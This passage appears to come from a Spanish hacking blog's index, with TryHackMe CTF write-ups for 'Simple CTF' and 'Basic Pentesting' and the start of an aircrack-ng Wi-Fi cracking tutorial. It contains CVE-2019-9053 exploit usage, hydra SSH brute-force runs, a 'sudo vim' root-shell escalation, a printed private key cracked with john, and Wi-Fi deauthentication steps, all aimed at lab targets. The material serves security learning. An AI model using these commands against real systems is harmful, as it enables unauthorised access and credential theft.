products # at: # # attn: cups licensing information # easy software products # 44141 airport view drive, suite 204 # hollywood, maryland 20636-3111 usa # # voice: (301) 373-9600 # email: cups-info@cups.org # www: http://www.cups.org # user-agent: * disallow: / disallow: /openemr-5_0_1_3 # # end of \u0026#34;$id: robots.txt 3494 2003-03-19 15:37:44z mike $\u0026#34;. entro en la dirección encontrada y veo que tienen un cms llamado cms made simple (version 2.2.8).\nhago una busqueda rápida para ver que vulnerabilidades puede tener.\nhttps://www.exploit-db.com/exploits/46635\ncve-2019-9053 es una vulnerabilidad de tipo sql injection. en el script que descargo vienen unas intrucciones:\n[+] example usage (with cracking password): exploit.py -u http://target-uri --crack -w /path-wordlist\u0026#34; aquí acaba la fase de recopilación de información, en principio\u0026hellip;\nexplotación vamos a aprovecharnos de la mala configuración del servidor ftp para acceder y husmear un poco, por si hubiese algo de utilidad.\n┌──(alberto㉿kali)-[~/descargas] └─$ ftp 10.10.91.117 connected to 10.10.91.117. 220 (vsftpd 3.0.3) name (10.10.91.117:alberto): anonymous 230 login successful. remote system type is unix. using binary mode to transfer files. ftp\u0026gt; ls 229 entering extended passive mode (|||47009|) ftp: can\u0026#39;t connect to `10.10.91.117:47009\u0026#39;: expiró el tiempo de conexión 200 eprt command successful. consider using epsv. 150 here comes the directory listing. drwxr-xr-x 2 ftp ftp 4096 aug 17 2019 pub 226 directory send ok. ftp\u0026gt; cd pub 250 directory successfully changed. ftp\u0026gt; ls 200 eprt command successful. consider using epsv. 150 here comes the directory listing. -rw-r--r-- 1 ftp ftp 166 aug 17 2019 formitch.txt 226 directory send ok. ftp\u0026gt; get formitch.txt local: formitch.txt remote: formitch.txt 200 eprt command successful. consider using epsv. 150 opening binary mode data connection for formitch.txt (166 bytes). 100% |***************************************************************************************************************************** ********************************************************************| 166 4.52 mib/s 00:00 eta 226 transfer complete. 166 bytes received in 00:00 (4.43 kib/s) ftp\u0026gt; exit 221 goodbye. ┌──(alberto㉿kali)-[~/descargas] └─$ cat formitch.txt dammit man... you\u0026#39;te the worst dev i\u0026#39;ve seen. you set the same pass for the system user, and the password is so weak... i cracked it in seconds. gosh... what a mess! vale ahora tenemos un usuario vulnerable, mitch, que tiene una contraseña débil. necesitamos conseguir la contraseña, para ello hay que usar el script de cve-2019-9053. lo ejecuto contra la máquina y le paso una wordlist para intentar crackear la contraseña.\n└─$ python3 cve-2019-9053-python3.py -u http://10.10.60.189/simple/ --crack -w /usr/share/wordlists/rockyou.txt [+] salt for password found: 1dac0d92e9fa6bb2 [+] username found: mitch [+] email found: admin@admin.com [*] try: 0c01f4468bd75d7a84c7eb73846e8d96$ [*] now try to crack password traceback (most recent call last): file \u0026#34;/home/alberto/descargas/cve-2019-9053-python3.py\u0026#34;, line 184, in \u0026lt;module\u0026gt; crack_password() file \u0026#34;/home/alberto/descargas/cve-2019-9053-python3.py\u0026#34;, line 53, in crack_password for line in dict.readlines(): file \u0026#34;/home/alberto/.pyenv/versions/3.10.7/lib/python3.10/codecs.py\u0026#34;, line 322, in decode (result, consumed) = self._buffer_decode(data, self.errors, final) unicodedecodeerror: \u0026#39;utf-8\u0026#39; codec can\u0026#39;t decode byte 0xf1 in position 933: invalid continuation byte parece que el script da algun problema al ejecutarlo con python 3.8, que es el que tengo. estos son los datos que ha podido obtener de momento:\n[+] username found: mitch [+] email found: admin@admin.com [*] try: 0c01f4468bd75d7a84c7eb73846e8d96$ para no perder mas tiempo en arreglar el script para que sea compatible, o buscar la manera de ejecutarlo con python2, voy a hacer un ataque de fuerza bruta contra el servicio ssh usando el usuario que hemos encontrado, ya que la contraseña parece ser muy sencilla. para hacerlo, voy a usar la herramienta hydra.\n┌──(alberto㉿kali)-[~/descargas] └─$ hydra -l mitch -p /usr/share/wordlists/rockyou.txt ssh://10.10.60.189:2222 hydra v9.3 (c) 2022 by van hauser/thc \u0026amp; david maciejak - please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-16 00:03:20 [warning] many ssh configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [warning] restorefile (you have 10 seconds to abort... (use option -i to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [data] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [data] attacking ssh://10.10.60.189:2222/ [2222][ssh] host: 10.10.60.189 login: mitch password: secret 1 of 1 target successfully completed, 1 valid password found [warning] writing restore file because 1 final worker threads did not complete until end. [error] 1 target did not resolve or could not be connected [error] 0 target did not complete hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-16 00:03:38 ya tenemos la contraseña, era muy insegura. ahora puedo entrar en el equipo por ssh y obtener la primera bandera.\n┌──(alberto㉿kali)-[~/descargas] └─$ ssh mitch@10.10.60.189 -p 2222 the authenticity of host \u0026#39;[10.10.60.189]:2222 ([10.10.60.189]:2222)\u0026#39; can\u0026#39;t be established. ed25519 key fingerprint is sha256:iq4f0xcna5nnpnaufeqopvtbo8dojpchggmeabedq5g. this key is not known by any other names are you sure you want to continue connecting (yes/no/[fingerprint])? yes warning: permanently added \u0026#39;[10.10.60.189]:2222\u0026#39; (ed25519) to the list of known hosts. mitch@10.10.60.189\u0026#39;s password: welcome to ubuntu 16.04.6 lts (gnu/linux 4.15.0-58-generic i686) * documentation: https://help.ubuntu.com * management: https://landscape.canonical.com * support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. last login: mon aug 19 18:13:41 2019 from 192.168.0.190 $ whoami mitch $ ls user.txt $ cat us\tcat: us: no such file or directory $ cat user.txt g00d j0b, keep up! $ por último, hay que buscar la manera de escalar privilegios. una de las formas mas rápidas es buscar algún binario que nos permita usarlo para hacer un bypass a las restricciones de seguridad del sistema. en la página de gtfobins busco el binario del vim, que ya lo he usado antes en otras máquinas, y compruebo que esté instalado en el sistema que estoy atacando.\nhttps://gtfobins.github.io/gtfobins/vim/#sudo\nestos son los métodos que hay para vim:\n#sudo #if the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. sudo vim -c \u0026#39;:!/bin/sh\u0026#39; #this requires that vim is compiled with python support. prepend :py3 for python 3. sudo vim -c \u0026#39;:py import os; os.execl(\u0026#34;/bin/sh\u0026#34;, \u0026#34;sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;reset; exec sh\u0026#34;)\u0026#39; #this requires that vim is compiled with lua support. sudo vim -c \u0026#39;:lua os.execute(\u0026#34;reset; exec sh\u0026#34;)\u0026#39; y por suerte, la máquina objetivo lo tiene:\n$ type vim vim is a tracked alias for /usr/bin/vim ejecuto el primer método y obtengo acceso al usuario root.\n$sudo vim -c \u0026#39;:!/bin/sh\u0026#39; # whoami root # cd root\t# ls root.txt # cat root.txt w3ll d0n3. you made it! # con este último paso hemos completado la sala. fácil, sencilla y en cómodos pasos.\n(◕‿‿◕) hack the planet! ","title":"Simple CTF [TryHackMe]"},{"date":"2022-10-12","image":"/images/post_pics/basic-pentesting/moMbBki.png","link":"https://k3ssdev.github.io/posts/basic-pentesting/","summary":"Basic Pentesting - TryHackMe \u0026gt; Hoy traigo unos apuntes que me he hecho para una máquina fácil de TryHackMe. En ella se repasan los coneptos más básicos de reconocimiento, ataques de fuerza bruta y enumeración de servicios. A continuación dejo el enlace de THM:","tags":["CTF","easy","hacking","Linux","tryhackme","Tryhackme","writeup"],"text":"basic pentesting - tryhackme \u0026gt; hoy traigo unos apuntes que me he hecho para una máquina fácil de tryhackme. en ella se repasan los coneptos más básicos de reconocimiento, ataques de fuerza bruta y enumeración de servicios. a continuación dejo el enlace de thm:\nbasic pentesting\nsegún dice la introducción de la sala, estos son los conceptos que se van a aprender con ésta máquina:\nbrute forcing hash cracking service enumeration linux enumeration se puede usar al \u0026ldquo;attackbox\u0026rdquo; de tryhackme o, como es mi caso, conectarse por vpn y atacar con mi propia máquina.\n¡así que vamos a ello!\nreconocimiento el primer paso es iniciar la máquina vulnerable y esperar a que nos de la dirección ip. una vez la tenemos, un simple ping nos ayudará a estar seguros de que estamos en la misma red y vemos a la máquina objetivo. en mi caso, me ha dado la ip 10.10.59.211 y con el ping compruebo que veo al objetivo.\nejecuto un reconocimiento de puertos usando nmap. en esta máquina no importa hacer algo de ruido, asi que uso las opciones -sc (\u0026ndash;script=default) y \u0026ndash;open (mostrar solo puertos abiertos):\n┌──(alberto㉿kali)-[~/descargas] └─$ nmap -sc --open 10.10.59.211 starting nmap 7.93 ( https://nmap.org ) at 2022-10-12 15:48 cest nmap scan report for 10.10.59.211 host is up (0.038s latency). not shown: 994 closed tcp ports (conn-refused) port state service 22/tcp open ssh | ssh-hostkey: | 2048 db45cbbe4a8b71f8e93142aefff845e4 (rsa) | 256 09b9b91ce0bf0e1c6f7ffe8e5f201bce (ecdsa) |_ 256 a5682b225f984a62213da2e2c5a9f7c2 (ed25519) 80/tcp open http |_http-title: site doesn\u0026#39;t have a title (text/html). 139/tcp open netbios-ssn 445/tcp open microsoft-ds 8009/tcp open ajp13 | ajp-methods: |_ supported methods: get head post options 8080/tcp open http-proxy |_http-favicon: apache tomcat |_http-title: apache tomcat/9.0.7 host script results: | smb-os-discovery: | os: windows 6.1 (samba 4.3.11-ubuntu) | computer name: basic2 | netbios computer name: basic2\\x00 | domain name: \\x00 | fqdn: basic2 |_ system time: 2022-10-12t09:48:31-04:00 |_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: -1s | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 311: |_ message signing enabled but not required |_nbstat: netbios name: basic2, netbios user: \u0026lt;unknown\u0026gt;, netbios mac: 000000000000 (xerox) | smb2-time: | date: 2022-10-12t13:48:31 |_ start_date: n/a nmap done: 1 ip address (1 host up) scanned in 31.92 seconds en el escaneo de puertos ya vemos algunas cosas interesantes:\ntiene el puerto 22 abierto para un servicio ssh. en el puerto 80 tiene un servidor apache. tiene un servicio smb en el puerto 445 vamos a empezar por el vector más obvio, el servidor web. asi que pongo la ip en la barra de direcciones del navegador y miro lo que hay.\nla página está en construcción, pero podría haber más páginas colgadas que ahora mismo no podemos ver. es en este momento cuando uso la herramienta gobuster para intentar descubrir si hay algo.\n┌──(alberto㉿kali)-[~] └─$ gobuster dir -u http://10.10.59.211/ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt =============================================================== gobuster v3.2.0-dev by oj reeves (@thecolonial) \u0026amp; christian mehlmauer (@firefart) =============================================================== [+] url: http://10.10.59.211/ [+] method: get [+] threads: 10 [+] wordlist: /usr/share/wordlists/dirbuster/directory-list-1.0.txt [+] negative status codes: 404 [+] user agent: gobuster/3.2.0-dev [+] timeout: 10s =============================================================== 2022/10/12 16:13:01 starting gobuster in directory enumeration mode =============================================================== /development (status: 301) [size: 318] [--\u0026gt; http://10.10.59.211/development/] progress: 9638 / 141709 (6.80%)^c [!] keyboard interrupt detected, terminating. =============================================================== 2022/10/12 16:13:41 finished gobuster va probando una lista de palabras detrás de la dirección que he indicado, y dependiendo del mensaje http que reciba, marca la dirección como coincidencia positiva o negativa. en este caso, parece que hay una pagína de devolopment colgada, así que pruebo a acceder a ella.\nen estos ficheros veo que han configurado un servicio smb y que hay dos desarrolladores, uno llamado j y otro llamado k, que se intercambian mensajes. al parecer, k deja un mensaje a j sobre que la contraseña que ha puesto a su usario es muy débil y no cumple con las reglas de seguridad de la empresa. esto es importante, ¡ya sabemos que necesitamos conseguir el usuario de j!\nbien, pues ahora toca hacer una enumeración del servicio smb usando la herramienta enum4linux para conseguir el usuario de j.\n┌──(alberto㉿kali)-[~] └─$ enum4linux 10.10.59.211 starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on wed oct 12 16:22:02 2022 =========================================( target information )========================================= target ........... 10.10.59.211 rid range ........ 500-550,1000-1050 username ......... \u0026#39;\u0026#39; password ......... \u0026#39;\u0026#39; known usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ============================( enumerating workgroup/domain on 10.10.59.211 )============================ [+] got domain/workgroup name: workgroup ================================( nbtstat information for 10.10.59.211 )================================ looking up status of 10.10.59.211 basic2 \u0026lt;00\u0026gt; - b \u0026lt;active\u0026gt; workstation service basic2 \u0026lt;03\u0026gt; - b \u0026lt;active\u0026gt; messenger service basic2 \u0026lt;20\u0026gt; - b \u0026lt;active\u0026gt; file server service ..__msbrowse__. \u0026lt;01\u0026gt; - \u0026lt;group\u0026gt; b \u0026lt;active\u0026gt; master browser workgroup \u0026lt;00\u0026gt; - \u0026lt;group\u0026gt; b \u0026lt;active\u0026gt; domain/workgroup name workgroup \u0026lt;1d\u0026gt; - b \u0026lt;active\u0026gt; master browser workgroup \u0026lt;1e\u0026gt; - \u0026lt;group\u0026gt; b \u0026lt;active\u0026gt; browser service elections ... el informe que nos muestra enum4linux es bastante completo y largo. tras revisarlo, me quedo con estos datos:\nel equipo se llama basic2 están compartiendo la carpeta //10.10.59.211/anonymous sin seguridad hay dos usuarios, kay y jan ataque de fuerza bruta contra ssh ahora ya tengo un usuario (jan) para poder realizar mi ataque de fuerza bruta contra el objetivo e intentar tener acceso remoto mediante ssh. para poder hacerlo, voy a usar la herramienta hydra y una wordlist para que pruebe contraseñas con el usuario jan. depende de lo larga que sea la lista, el ataque durará más o menos. en mi caso le llevó algunos minutos, asi que sed pacientes. paciencia\u0026hellip;.\n┌──(alberto㉿kali)-[~] └─$ hydra -l jan -p descargas/rockyou.txt 10.10.59.211 ssh hydra v9.3 (c) 2022 by van hauser/thc \u0026amp; david maciejak - please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-12 16:43:07 [warning] many ssh configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [warning] restorefile (you have 10 seconds to abort... (use option -i to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore [data] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task [data] attacking ssh://10.10.59.211:22/ [status] 176.00 tries/min, 176 tries in 00:01h, 14344223 to do in 1358:22h, 16 active [status] 128.00 tries/min, 384 tries in 00:03h, 14344015 to do in 1867:43h, 16 active [22][ssh] host: 10.10.59.211 login: jan password: armando 1 of 1 target successfully completed, 1 valid password found hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-12 16:49:50 ya tenemos la clave: armando. ahora me conecto por ssh con el usuario de jan y vemos que hay ahí dentro.\n┌──(alberto㉿kali)-[~] └─$ ssh jan@10.10.59.211 the authenticity of host \u0026#39;10.10.59.211 (10.10.59.211)\u0026#39; can\u0026#39;t be established. ed25519 key fingerprint is sha256:xkjdklkocbzjcch0tpriw1pelpuzduftgza4xmda+o4. this host key is known by the following other names/addresses: ~/.ssh/known_hosts:12: [hashed name] are you sure you want to continue connecting (yes/no/[fingerprint])? yes warning: permanently added \u0026#39;10.10.59.211\u0026#39; (ed25519) to the list of known hosts. jan@10.10.59.211\u0026#39;s password: welcome to ubuntu 16.04.4 lts (gnu/linux 4.4.0-119-generic x86_64) * documentation: https://help.ubuntu.com * management: https://landscape.canonical.com * support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. the programs included with the ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. ubuntu comes with absolutely no warranty, to the extent permitted by applicable law. the programs included with the ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. ubuntu comes with absolutely no warranty, to the extent permitted by applicable law. last login: mon apr 23 15:55:45 2018 from 192.168.56.102 jan@basic2:~$ sabemos que hay otro usuario llamado kay, así que tiene que tener una carpeta personal. me muevo hasta ella y reviso que hay.\njan@basic2:~$ ls -la total 12 drwxr-xr-x 2 root root 4096 apr 23 2018 . drwxr-xr-x 4 root root 4096 apr 19 2018 .. -rw------- 1 root jan 47 apr 23 2018 .lesshst jan@basic2:~$ cd .. jan@basic2:/home$ ls jan kay jan@basic2:/home$ cd kay jan@basic2:/home/kay$ ls -la total 48 drwxr-xr-x 5 kay kay 4096 apr 23 2018 . drwxr-xr-x 4 root root 4096 apr 19 2018 .. -rw------- 1 kay kay 756 apr 23 2018 .bash_history -rw-r--r-- 1 kay kay 220 apr 17 2018 .bash_logout -rw-r--r-- 1 kay kay 3771 apr 17 2018 .bashrc drwx------ 2 kay kay 4096 apr 17 2018 .cache -rw------- 1 root kay 119 apr 23 2018 .lesshst drwxrwxr-x 2 kay kay 4096 apr 23 2018 .nano -rw------- 1 kay kay 57 apr 23 2018 pass.bak -rw-r--r-- 1 kay kay 655 apr 17 2018 .profile drwxr-xr-x 2 kay kay 4096 apr 23 2018 .ssh -rw-r--r-- 1 kay kay 0 apr 17 2018 .sudo_as_admin_successful -rw------- 1 root kay 538 apr 23 2018 .viminfo jan@basic2:/home/kay$ cat pass.bak cat: pass.bak: permission denied jan@basic2:/home/kay$ tenemos un fichero llamado pass.bak que tiene pinta de ser la bandera de la sala para la última pregunta. desgraciadamente no puedo acceeder a su contenido. sin embargo veo hay una carpeta oculta llamada .ssh, seguramente contendra la clave de autenticación ssh encriptada. vamos a echarle un ojo:\njan@basic2:/home/kay$ ls .ssh/ authorized_keys id_rsa id_rsa.pub jan@basic2:/home/kay$ cat .ssh/id_rsa -----begin rsa private key----- proc-type: 4,encrypted dek-info: aes-128-cbc,6aba7de35cdb65070b92c1f760e2fe75 ionb/j0q2pd56ez23oaajxlvhusz1crrr4onguankcrxg3+9vn6xcujpzuduutlz o9dyiejb4wuztuebpsmb487rdfvktovqrvhty1k2aly2lka2cnfjz8llv+fmadsn xrvjw/hrigcxpy8b7nsa1eipyrpzhih3qofiylspmyv79rc65i6frkdsvxxzbdfx akan+3t5fu49aevkbjtznltebw31mxjv0llxaqiax5qfexmaciqouwchatlpvxmn lg4bag7cvxs1ampieflx7un4rub9nzs4zp0lplbcb4ueawx0tt+vkd6kzh+bk0au hwqjcdnb/u+drasu3oxqyklku2dpseu7rlvpaqa6y+ogk/wotbntrkrngkqlqxml liwzye4yrletfc275hzvvyh6fklgtofaly0bmqgirm+ewvoxorzpblv8iyntddde 3jrjqboglps01hawkirxupaer18lcz+oly00vw2onl2xkugtqpv2jwh04ygdxbfj lywlxxnjjpvmhkc6a75pe4zvxfmmt0qck4oko1argmqlfnwapxjyv6hauuovexn7 bupo+elyvs5mo5tbpwdhi0nrfngp1t6bn7tvb77acaygzhdlpiaqzmv/0hwrtnrb rvhy1cuf7xgnmbmzyhznewmppe2i8mfsavfcjec3cdgn5tvquxfh6cjjrvrhdxvy vqvjsot+czf7mbwm5nfstpplonndc6jmrueujeiblzbcw6bx5s+b95efecewmmve b0whqnptdtvtg3sfdjxp0hggxqk4bambnm4chfck7rpvcrjskywyvedjmyvc87z0 ysvopvn9wnfoudon+u4pyp6pmnu4zd2qekniwyexzizmyypugcfda0sarf6/kkwg ohoacck3ihaqkkbo+sflgxbahxb6k0ocmqawioxyjunpkn8bzzlqljs1jrzxibhl vapev7x25nauyu5u4bgtfhb/f8abkbel4xlwr+4hxbotpjx6rvbyepz/kvioq3s1 gpwhsrzon320xa4hopkcg66jdyhls6b328uvii6da6fryiona4tejjtpo5rpcsek qkig65gicbpcwj1u4i9mehzehc0r2lyufzbnfyur0qcvo8+ms8x75seeonz8auql 4di4ixitq5sachp4y/ntmz1a3q0fnjzxaqdfk/htadhmq5digxnnw3tbmd8wgveg vfnsaexxeza39jogm3vbon6caxpz124kj0bewzxcbzwki0cphflyumodelqp/nik osxlojc8azemil5rah5gdclt4k67wei9j/jq6zlut0vsmlono1iifdsmo4nunyj3 z+3xtdtzoul5niy4jjcplhtnnjalqnpcoaqad7gv3rd/asml2l2kb0ut8prttt+s baxkpfh0dhmowngmdatjp+emrc6s896+haxvcvpxlknti7+jsntwupbcntsfvo19 l9+xxd55ytvo1y8rmwjopzx7h8ort7u+y9n/bvtbt+xzmylnu+3qoq4w2qoynm2p nzjvppeh+8dboucb5bfxsisknxnysced4lspxue4ums3yxbpz/44syy8kezrazai fn2nnjwq1u2fajwntmn5oishondeabf9ilaq46lsgpmrahnnxwzozh+/lgfqmgji i/zn/2kspuew/5mqwwvfik8qu38m7m+mli5zx76snfje9suva3ehhp2aen5hwdmw x+cudsixpo10rdx+ommoexmqn5xc3lvtz1rknqono7fa21czucmxi2j/ltmywzel oscgwntlqpb6sfldj5cfa5cdzlaxl1t7xdrzwggsnct+6cxszendyuolri9ez8xx ohhz45rgacphcdwcrkcbfoqs01hjq9nsje2w403ljmsx/u3ylauuavgrhkfoejnx cnputuhhcvqssr9cui5it5toz+iidfloyb+f82y0wn5tb6ptd/onvdtskilfe731 dwoy3zfl0l1fl6ag0ivwtrpbl1ggqoxf4wmbwv9bdf0zp/6uatviv1dheqpd8otj vxfx9bkdezp2ql2yohuekbdu+7dyu9k5ng0sqak7jjeokd7/m5i8cfwq/g5vqa8r sgsoxq5mr3mkf1n/w6pnbwxyh7n2ll36znfaco1v6szmaa8/489apbbjpxhutqnu eu/lp8xqlxmmpvpsdacmtqa1ipovl9m+a+stre2eyt8hzirmiuaaotziv4chuy6q 3qp52kfzzjbt3cin2amyv205enijvrsacpi3pzrnljsbgxmxokvxdvpc5mr/pniv wrrvsgjqjotpfrshhjq3qsoj/r/8/d1vcvtd4usfz+j1y9kxklat/ok491zk8nwg uruvqvbhds7cq8c5rfgjuyd79gugh3he5y7bl+mdxknzlmlzonauc5bkv4i+yuj7 agiexxrijxlwf4g0bsl5vbydm55xlnbryof62ucys9ecrar4ngmggcxfyyncxmyk axdkwswwwf/yhewx8ggtesv5ad+bxdemoiak8c1yy1tzwdamzsnosyhxuvlb4jn5 phql3r8orzetsuxxfdvkrpeaokee1vhevzqxvsohgcuidykca6al6wydi9i2+unr ogjvvvbvvzibh+w5yjhytrinq7dmqayx1yb2pmc+lergf3yrp9a2klaadk9dbqcv ev6ctcfzhbhyvqml1wqwduztrotwfl80jo8qdlq+he0bvcb/o2fxqkyetgfh4/uc d5qrshak15dnhh4ixrikpla799cxrhwi7mf5ji41f3o7iaejwkh6q/yjgpvgj8lg oscp/iugxt7u+91j7qov/rbtro7geyx5lc/sw1j6t6sjkega8m9fs10h4terepkt t/ccvlbkm22ewao8glguhn5vtanh0mtlnpjfnlvjcdhl0hkzi3zzmdrxhql+/wjq 4eacahk1hul3esen3zpqwrndgaapxh+lgpye8sz1it8apup8gzabufjbbefmwnyb e5ofsdluiohcvzsw/diurf+4liq3r36bu2r5+kmpfikkew1tywiy7cpfojsd74vc 3jt1/zw3xcb76r75sg5h6q4n8gu5c/m0cdq16h9mhwpdin9oztqo2znxfvpuxthy -----end rsa private key----- pues ya tenemos la clave privada de kay para acceder al servidor por ssh. me la copio en mi equipo y me preparo para romperla. aunque antes hay que convertirla en un formato compatible para la herramienta john the ripper. la guardo en un fichero llamado rsa_original y la paso por la herramienta ssh2john y hago que me la guarde en un fichero llamado crack.txt. despues la paso por john the ripper:\n┌──(alberto㉿kali)-[~/descargas] └─$ ssh2john rsa_original \u0026gt; crack.txt ┌──(alberto㉿kali)-[~/descargas] └─$ john --wordlist=rockyou.txt crack.txt using default input encoding: utf-8 loaded 1 password hash (ssh, ssh private key [rsa/dsa/ec/openssh 32/64]) tras unos minutos, obtenemos la contraseña: beeswax\nesta nos servirá para conectarnos por ssh con el usuario de kay, pero tenemos que usar la clave pública para que nos permita realizar la conexión, así que aprovechamos el equipo en el que nos hemos colado que tiene los dos pares de claves para hacer la conexión desde aqui:\njan@basic2:/home/kay/.ssh$ ssh -i id_rsa kay@10.10.59.211 could not create directory \u0026#39;/home/jan/.ssh\u0026#39;. the authenticity of host \u0026#39;10.10.59.211 (10.10.59.211)\u0026#39; can\u0026#39;t be established. ecdsa key fingerprint is sha256:+fk53v/lb+2pn4opl7gn/duvhvvo0lt9n4w5ifchysq. are you sure you want to continue connecting (yes/no)? yes failed to add the host to the list of known hosts (/home/jan/.ssh/known_hosts). enter passphrase for key \u0026#39;id_rsa\u0026#39;: welcome to ubuntu 16.04.4 lts (gnu/linux 4.4.0-119-generic x86_64) * documentation: https://help.ubuntu.com * management: https://landscape.canonical.com * support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. last login: mon apr 23 16:04:07 2018 from 192.168.56.102 kay@basic2:~$ cat pass.bak heresareallystrongpasswordthatfollowsthepasswordpolicy$$ y tras conectarme por ssh con el usuario de kay, puedo mostrar el contenido del fichero pass.bak y obtener la bandera final de la sala heresareallystrongpasswordthatfollowsthepasswordpolicy$$\n¡nos vemos!\n(◕‿‿◕) hack the planet! ","title":"Basic Pentesting [TryHackMe]"},{"date":"2022-09-29","image":"/images/post_pics/tutorial-aircrack/aircrack-ng-new-logo.jpg","link":"https://k3ssdev.github.io/posts/aircrack-ng_hacking_wifi/","summary":"Aircrack-ng: hacking de redes WiFi \u0026gt; En este post voy a explicar brevemente los principales conceptos del hacking de redes WiFi, obviamente con fines educativos y en un entorno controlado. Para analizar las redes inalámbricas y crackear las contraeñas voy a usar el conjunto de herramientas que proporiona Aircrack-ng.","tags":["cracking","hacking","hashcat","linux","tutorial","wifi"],"text":"aircrack-ng: hacking de redes wifi \u0026gt; en este post voy a explicar brevemente los principales conceptos del hacking de redes wifi, obviamente con fines educativos y en un entorno controlado. para analizar las redes inalámbricas y crackear las contraeñas voy a usar el conjunto de herramientas que proporiona aircrack-ng.\nmonitorización: escaneo de redes y captura de paquetes. usaremos las herrmientas airmon-ng (cambia la interfaz wifi a modo monitor) y airodum-ng (scan y captura). ataques: replay attacks, desautenticaciones, puntos de acces falsos y otros ataques. se usará el paquete aireplay-n. cracking: romper contraseñas wep y wpa/wpa2-psk. aquí usaremos aircrack-ng. aunque la guía está hecha en linux (con kali instalado en una raspberry pi 4), todo esto puede hacerse sin problema en windows y macos, en la misma página oficial vienen los pasos para instalarlo en dichas plataformas.\npágina oficial de aircrack-ng\ngithub aircrack-ng\nteoría protocolo 4-way handshake como nos vamos a centrar en capturar paquetes de redes protegidas con wpa/wpa2, vamos a conocer un poco el proceso. aunque ya lo expliqué en el post anterior (tutorial del pwnagotchi), recordarlo no está demás. para poder obtener los hashes de las contraseñas wpa y poder crackearlas, es necesario capturar paquetes que contengan paquetes del protocolo 4-way handshake, en el que se intercambian mensajes con la clave precompartida (psk) para validar la sesión entre el cliente y el punto de acceso.\n*source: https://pwnagotchi.ai/intro/\nmientras se monitoizan las redes, ap y cliente pueden intercambar las psk. pero si con eso no fuese suficiente, usaremos las mismas técnicas que aprendimos con nuestro amigo pwnagotchi:\ndesautenticar los clientes conectados al ap. un dispositivo desautenticado debe volver a autenticarse en su punto de acceso volviendo a realizar el protocolo 4-way handshake con el ap, permitiendo capturar los paquetes de protocolo de enlace y recopilar más material descifrable.\nenvíar tramas de asociación directamente a los propios puntos de acceso para intentar forzarlos a filtrar el pmkid.\nsi tenemos exito y logamos capturar los paquetes que contengan los handshakes, podremos extraer el hash de la contraseña y crackearlo mediante un ataque de fuerza bruta o de diccionario.\nvamos al lío lo primero es instalarlo. no quiero extederme mucho, ya que viene instalado por defecto en kali linux y parrot os, pero si no lo teneis en vuestro sistema echad un vistazo al github de aircrack-ng. tambien necesitarás un adaptador wifi que permita el modo monitor (muchos adaptadores integrados en portatiles no lo admiten, es posible que necesites un adaptador externo). si tienes una raspberry pi es una buena opción, yo la he probado y funciona sin problemas.\nlo siguiente que voy a hacer es revisar las interfaces de red y comprobar que está funcionando correctamente. ejecutamos el comando ip a para ver las interfaces y la configuración de las mismas. despues, pondremos la interfaz inalambrica en modo monitor, de forma que pueda capturar paquetes e inyectar si es necesario.\nip a aqui es importante tener en cuenta como se llama la interfaz wifi que vamos a usar. en mi caso, se llama wlan0, pero puede tener otro nombre. además, es posible que los servicios en marcha impidan que se cambie a modo monitor, en tal caso hay que ejecutar los siguientes comandos:\nsudo airmon-ng check kill sudo airmon-ng start wlan0 en la captura se ve que ejecuto primero el comando de start wlan0 pero me da un error ya que hay servicios fucionando que lo impiden. en mi caso, ejecuté el check kill y despues el start wlan0 de nuevo.\nahora que la tarjeta wifi esta en modo monitor, podemos escanear las redes a nuestro alcance y analizar cual será el objetivo. he preparado una red llamada ap_test que usaré como objetivo. la contraseña que he preparado para esta red es sencilla, acd1234, de modo que pueda explicar el proceso completo de forma segura. mientras se monitrizan las redes wifi, podemos usar el tabulador para seleccionar los ap y movernos por ellos con las flechas. además, podemos marcar con colores las redes con la tecla m, o podemos ordenarlas con la tecla s por diferentes criterios. sudo airodump-ng wlan0mon #en mi caso wlan0mon es el nombre que tiene la tarjeta tras activarla en modo monitor, comprueba el nombre de la tuya, puede que no haya cambiado tras elegir el objetivo, vamos a monitorizar el ap elegido y guardarmos los datos en varios ficheros. necesitamos capturar los paquetes wpa que contengan potencalmente la clave precompartida. usaremos el mismo comando que en el punto anterior, pero sta vez añadiremos las opiones para enfocarnos en el ap elegido, el canal en el que trabaja y estableceremos el prefijo de los ficheros generados. sudo airodump-ng wlan0mon -c \u0026#34;numero de canal\u0026#34; --bssid \u0026#34;mac address del ap\u0026#34; -w \u0026#34;nombre_fichero\u0026#34; si la señal es buena y los clientes y el ap intercambian paquetes que contengan los wpahandshakes, el programa nos indicará que se ha consguido con un mensaje en la esquina superior derecha que pone [wpa hanshake: \u0026ldquo;mac address ap\u0026rdquo;]\npor último, ya solo nos queda tratar los ficheros .cap obtenidos y crackear los hashes resultantes para obtener la clave wpa/wpa2. aunque se puede hacer con el propio aircrack-ng, he optado por hacerlo como explqué en el tutorial del pwnagotchi, usando hcxtools para convertir el fichero de las 